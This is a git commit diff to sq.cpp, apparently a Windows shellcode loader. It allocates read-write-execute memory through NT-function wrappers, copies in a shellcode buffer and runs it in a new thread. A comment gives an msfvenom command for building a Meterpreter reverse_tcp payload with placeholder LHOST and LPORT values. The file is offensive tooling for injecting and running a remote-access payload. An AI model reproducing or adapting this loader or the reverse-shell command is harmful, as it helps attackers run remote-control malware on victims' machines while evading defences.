f53acd0557ce3286b9b8b319e62dc381d5a1bd40
Best Cat <139585282+Sqttyxsq@users.noreply.github.com>
2024-06-09 17:17:20 +0200

    Update sq.cpp

--- sq.cpp
+++ sq.cpp
@@ -1,21 +1,34 @@
-#include "Sq.h"
-
-unsigned char shellcode[] = {
     // define your shellcode
     // msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip LPORT=port -f c -b "\x00\x0a\x0d" EXITFUNC=thread 
     // or create you personall shellcode 
-    0x00
-};
+
+#include "sq.h"
 
 int main() {
+    if (!InitNtFunctions()) {
+        printf("Failed to initialize NT functions\n");
+        return 1;
+    }
 
-    Sq_AllocateMemory(baseAddress, regionSize, allocationType, protect);
+    processHandle = GetCurrentProcess();
+    baseAddress = NULL;
+    regionSize = sizeof(shellcode);
+    allocationType = MEM_COMMIT | MEM_RESERVE;
+    protect = PAGE_EXECUTE_READWRITE;
+
+    Sq_AllocateMemory(processHandle, baseAddress, regionSize, allocationType, protect);
     Sq_WriteVirtualMemory(processHandle, baseAddress, shellcode, sizeof(shellcode));
+
+    protect = PAGE_EXECUTE_READWRITE;
     Sq_ProtectVirtualMemory(processHandle, baseAddress, regionSize, protect);
+
     Sq_CreateThreadEx(threadHandle, processHandle, baseAddress);
     Sq_WaitForSingleObject(threadHandle);
-    Sq_Close(threadHandle);
+
     Sq_FreeVirtualMemory(processHandle, baseAddress, regionSize);
+
+    Sq_Close(processHandle);
 
     return 0;
 }
+
